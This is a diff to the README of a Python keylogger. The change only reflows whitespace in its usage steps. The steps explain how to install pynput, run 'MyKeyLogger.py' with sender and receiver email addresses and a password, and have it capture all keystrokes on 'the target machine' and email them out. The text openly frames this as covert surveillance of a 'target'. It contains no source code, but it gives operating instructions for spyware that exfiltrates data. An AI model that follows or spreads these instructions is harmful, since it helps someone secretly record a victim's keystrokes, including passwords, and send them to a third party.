@@ -3,8 +3,8 @@ Keylogger is a tool that helps you when you try to capture your target's keystro
 USAGE: 
 ```
 1.1-) FOR WINDOWS: Open cmd and write this command -> cd Desktop
-1.2-) C:\Users\IEUser\Appdata\Local\Programs\Python\Python310\python.exe -m pip install pynput(First part is your python.exe's location change it properly                 for your device python.exe location)      
-1.3-) After you install pynput library, run the KeyLogger with -> C:\Users\IEUser\Appdata\Local\Programs\Python\Python310\python.exe python3 MyKeyLogger.py               -m (Keylogger sender E-mail address) -t (Keylogger logs receiver E-mail address) -p (Sender E-mail adress' password)
+1.2-) C:\Users\IEUser\Appdata\Local\Programs\Python\Python310\python.exe -m pip install pynput(First part is your python.exe's location change it properly for your       device python.exe location)      
+1.3-) After you install pynput library, run the KeyLogger with -> C:\Users\IEUser\Appdata\Local\Programs\Python\Python310\python.exe python3 MyKeyLogger.py -m             (Keylogger sender E-mail address) -t (Keylogger logs receiver E-mail address) -p (Sender E-mail adress' password)
 1.4-) After that, keylogger will capture all of the keystrokes on the target machine and will send E-mails that contains keystrokes from the target.   
 2.1-) FOR LINUX: Open terminal and write this command -> pip3 install pynput
 1.2-) cd /root/PycharmProjects/Keylogger
